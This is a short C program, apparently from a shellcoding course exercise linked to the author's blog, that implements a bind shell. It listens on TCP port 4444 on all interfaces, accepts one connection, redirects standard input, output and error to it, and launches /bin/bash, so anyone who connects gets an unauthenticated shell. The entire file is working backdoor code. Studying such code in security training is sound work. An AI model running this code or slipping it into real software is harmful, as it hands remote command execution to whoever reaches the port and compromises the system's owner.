// Author: Bobby Cooke
// Blog:   https://boku7.github.io/2020/04/06/SLAE64_1_BindShell.html
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <stdlib.h>
int main(void)
{
  int ipv4Socket = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
  struct sockaddr_in ipSocketAddr = { 
    .sin_family = AF_INET, 
    .sin_port = htons(4444), 
    .sin_addr.s_addr = htonl(INADDR_ANY) 
  };
  bind(ipv4Socket, (struct sockaddr*) &ipSocketAddr, sizeof(ipSocketAddr));
  listen(ipv4Socket, 0);
  int clientSocket = accept(ipv4Socket, NULL, NULL);
  dup2(clientSocket, 0);
  dup2(clientSocket, 1);
  dup2(clientSocket, 2);
  execve("/bin/bash", NULL, NULL);
}

